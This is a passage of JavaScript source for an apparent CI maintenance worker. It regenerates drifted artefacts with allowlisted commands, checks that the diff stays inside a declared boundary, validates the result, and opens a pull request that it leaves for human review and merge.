      pullRequest = await openPullRequestWithRetry({
        open: () => github("POST", "/pulls", { title, head: plan.branch, base: "main", body, maintainer_can_modify: true }),
        findOpen: async () =>
          (await github("GET", `/pulls?state=open&head=${encodeURIComponent(`${owner}:${plan.branch}`)}&per_page=1`))[0] || null,
        log: say
      });
    } catch (error) {
      await report(
        OUTCOMES.BLOCKED,
        `the repair is validated and pushed to \`${plan.branch}\`, but the pull request could not be opened: ${error.message}. The next run opens it for this branch without repeating the repair.`
      );
    }
    say(`Opened pull request #${pullRequest.number}: ${pullRequest.html_url}`);
    say("It is NOT merged and must not be auto-merged. A human reviews and merges it.");

    // The exact-head gate, and the reason it lives here rather than in a later
    // workflow step: a pull request opened with the Actions token raises no
    // `pull_request` run, so without this the head a human would merge carries no
    // verdict at all — and a step that ran *after* the outcome was reported would
    // leave the issue and the job summary claiming FIXED for a head that had
    // gone red. Earning it before the report is what makes the terminal outcome
    // honest: FIXED means the pushed head is green.
    const verdict = await earnRequiredCheck({
      request,
      repo,
      branch: plan.branch,
      sha: pullRequest.head.sha,
      timeoutMs: Number(process.env.REQUIRED_CHECK_TIMEOUT_MS || DEFAULT_TIMEOUT_MS),
      pollMs: Number(process.env.REQUIRED_CHECK_POLL_MS || DEFAULT_POLL_MS),
      log: say
    });
    if (!verdict.ok) {
      await report(
        OUTCOMES.NEEDS_HUMAN,
        `the repair validated in-job and is pushed to \`${plan.branch}\` as pull request #${pullRequest.number}, but Prelaunch Validation did not come back green on that exact head: ${verdict.detail}${verdict.url ? ` (${verdict.url})` : ""}. The pull request is open and must not be merged until that is resolved.`,
        pullRequest
      );
    }
    say(`Prelaunch Validation passed on ${pullRequest.head.sha.slice(0, 7)}${verdict.url ? `: ${verdict.url}` : ""}`);
    await report(OUTCOMES.FIXED, fixedReason, pullRequest);
  };

  // ── idempotence and concurrency ───────────────────────────────────────────
  const duplicate = existingRepair({ plan, openPullRequests });
  if (duplicate) {
    finish({ outcome: OUTCOMES.NO_SAFE_WORK, reason: `a repair is already in flight: ${duplicate.reason}`, plan });
  }

  // A branch with no open pull request is never re-pushed over. The one case
  // finished without a human is this worker's own validated push whose pull
  // request was never opened (resumableBranchDecision); a closed or merged pull
  // request, extra commits or a diff outside the boundary still need a human.
  let branchExists = false;
  try {
    await github("GET", `/git/ref/heads/${plan.branch}`);
    branchExists = true;
  } catch (error) {
    if (!/ 404: /.test(error.message)) throw error;
  }
  if (branchExists) {
    const owner = repo.split("/")[0];
    const [pullRequestsFromBranch, comparison] = await Promise.all([
      github("GET", `/pulls?state=all&head=${encodeURIComponent(`${owner}:${plan.branch}`)}&per_page=10`),
      github("GET", `/compare/main...${plan.branch}`)
    ]);
    const decision = resumableBranchDecision({ plan, pullRequestsFromBranch, comparison });
    if (!decision.resume) {
      await report(
        OUTCOMES.NEEDS_HUMAN,
        `\`${plan.branch}\` already exists on the remote with no open pull request, and it is not safe to resume: ${decision.reason}. A human should look at it and delete it before this repair runs again; re-pushing over it is not something this worker will decide on its own.`
      );
    }
    say(`Resuming ${plan.branch}: ${decision.reason}.`);
    if (DRY_RUN) {
      finish({ outcome: OUTCOMES.FIXED, reason: "dry run — would open the pull request for the branch an earlier run pushed.", plan });
    }
    const { title, body } = buildPullRequest({ plan, diff: { changed: decision.changed } });
    await publishPullRequest({
      title,
      body: `${body}\n\nResumed by a later run: an earlier run validated and pushed this branch but could not open its pull request.`,
      fixedReason: "An earlier run validated and pushed this repair but could not open its pull request; this run opened it and Prelaunch Validation passed on that exact head. One PR is open for human review."
    });
  }

  // ── repair ────────────────────────────────────────────────────────────────
  const dirty = workingTreeDirty();
  if (dirty) {
    await report(OUTCOMES.BLOCKED, "the working tree was not clean before the repair started, so the drift cannot be measured honestly.");
  }

  const observations = {};
  const step = async (label) => {
    const verdict = repairVerdict(observations);
    // `pending` means the next observation is still missing; FIXED means every
    // observation is in and publishing continues below. Everything else is
    // terminal, and the tree is restored before the run reports it.
    if (verdict.outcome === "pending" || verdict.outcome === OUTCOMES.FIXED) return;
    restoreWorkspace();
    await report(verdict.outcome, `${verdict.reason} (at: ${label}).`);
  };

  let providerRepair = null;
  if (plan.type === PROVIDER_URL_TYPE) {
    try { providerRepair = performProviderUrlRepair(plan, ROOT); }
    catch { providerRepair = { outcome: OUTCOMES.BLOCKED, reason: "Provider batch repair failed while reading or verifying repository evidence" }; }
    if (providerRepair.outcome) {
      restoreWorkspace();
      await report(providerRepair.outcome, providerRepair.reason);
    }
    say(providerRepair.reason);
  }
  const before = providerRepair ? { exit: 1, output: providerRepair.checkOutputBefore } : runAllowlistedCommand(plan.check);
  say("");
  say(`${plan.check ?? "Current provider coverage check"} exited ${before.exit} (a non-zero exit is the finding reproducing).`);
  observations.checkExitBefore = before.exit;
  await step("re-checking the finding");

  const regenerate = providerRepair ? { exit: 0 } : runAllowlistedCommand(plan.regenerate);
  say(`${plan.regenerate ?? "Bounded SeatGeek verification"} exited ${regenerate.exit}.`);
  observations.regenerateExit = regenerate.exit;
  if (regenerate.exit !== 0) say(regenerate.output);
  await step("running the approved regeneration");

  // Two reads, deliberately. The scoped one is the diff the entry declares; the
  // unscoped one is what the generator actually did to the tree, which is the
  // only thing that can prove it stayed inside its boundary.
  const scopedChanges = changedPathsUnder(plan.expectedPaths);
  const treeChanges = git(["status", "--porcelain", "--untracked-files=all"]).stdout
    .split("\n")
    .map((line) => line.slice(3).trim())
    .filter(Boolean);
  observations.diff = classifyDiff(treeChanges, plan);
  say(`The regeneration changed ${observations.diff.changed.length} path(s): ${observations.diff.changed.join(", ") || "none"}.`);
  if (observations.diff.unexpected.length) say(`Outside the declared artefacts: ${observations.diff.unexpected.join(", ")}`);
  if (observations.diff.protectedHits.length) say(`PROTECTED SURFACE TOUCHED: ${observations.diff.protectedHits.join(", ")}`);
  if (scopedChanges.length !== observations.diff.changed.length) {
    say(`(${scopedChanges.length} of them are inside the declared artefacts.)`);
  }
  await step("inspecting the diff");

  const after = providerRepair ? { exit: providerRepair.guard().ok ? 0 : 1 } : runAllowlistedCommand(plan.check);
  say(`${plan.check ?? "Provider field guard"} after repair exited ${after.exit}.`);
  observations.checkExitAfter = after.exit;
  if (after.exit !== 0) say(after.output);
  await step("confirming the repair");

  // ── validation ────────────────────────────────────────────────────────────
  const validationFailures = [];
  for (const command of plan.validation) {
    const result = runAllowlistedCommand(command);
    say(`${command} exited ${result.exit}.`);
    if (result.exit !== 0) {
      validationFailures.push(command);
      say(result.output);
      break;
    }
  }
  if (!validationFailures.length) {
    const whitespace = git(["diff", "--check"]);
    say(`git diff --check exited ${whitespace.exit}.`);
    if (whitespace.exit !== 0) {
      validationFailures.push("git diff --check");
      say(whitespace.stdout);
    }
  }
  observations.validationFailures = validationFailures;
  await step("running the required validation");
  // Validation must not enlarge the proposed repair's file or field scope.
  const finalPaths = git(["status", "--porcelain", "--untracked-files=all"]).stdout.split("\n").map((line) => line.slice(3).trim()).filter(Boolean);
  if (!classifyDiff(finalPaths, plan).ok || (providerRepair && !providerRepair.guard().ok)) {
    restoreWorkspace();
    await report(OUTCOMES.NEEDS_HUMAN, "Validation changed files or fields outside the declared repair boundary");
  }

  // ── publish ───────────────────────────────────────────────────────────────
  const { title, body } = buildPullRequest({ plan, diff: observations.diff, checkOutputBefore: before.output });

  if (DRY_RUN) {
    say("");
    say("Dry run: nothing pushed, no pull request opened, no comment written. Restoring the working tree.");
    restoreWorkspace();
    say(`Would have opened: ${title}`);
    finish({ outcome: OUTCOMES.FIXED, reason: "dry run — the repair validated cleanly and would have opened one pull request.", plan });
  }

  const commitMessage = providerRepair ? `${title}\n\nRefs #${plan.issueNumber}.\n${plan.providerSummary}` : [
    title,
    "",
    `Regenerated by the Stage 3 maintenance worker from work-queue issue #${plan.issueNumber}.`,
    `${plan.check} failed on main and passes after running ${plan.regenerate}.`,
    "Generated output only; no source file was edited."
  ].join("\n");

  const branchSteps = [
    ["checkout", "-b", plan.branch],
    ["add", "--", ...plan.expectedPaths],
    ["commit", "-m", commitMessage]
  ];
  for (const args of branchSteps) {
    const result = git(args);
    if (result.exit !== 0) {
      await report(OUTCOMES.BLOCKED, `\`git ${args[0]}\` failed while publishing the repair: ${truncate(result.stderr || result.stdout)}`);
    }
  }

  // The push is retried where the others are not: a freshly minted App
  // installation token is briefly refused by git-over-HTTPS with a 403 that
  // reads like a permanent settings problem. Only that signature is retried
  // — a push git rejected on the merits still blocks at once.
  const pushed = await pushWithRetry({
    args: ["push", "-u", "origin", plan.branch],
    run: (args) => {
      const result = git(args);
      return { status: result.exit, output: `${result.stdout || ""}${result.stderr || ""}` };
    }
  });
  if (!pushed.ok) {
    await report(OUTCOMES.BLOCKED, `\`git push\` failed while publishing the repair: ${truncate(pushed.output)}`);
  }
  say(`Pushed ${plan.branch}.`);

  await publishPullRequest({
    title,
    body,
    fixedReason: providerRepair ? `${plan.providerSummary}\nEvery required validation and Prelaunch Validation passed; one PR is open for human review.`
      : `\`${plan.regenerate}\` cleared \`${plan.check}\`, every required validation passed on exactly this content, Prelaunch Validation passed on the pushed head, and one pull request is open for review.`
  });
}
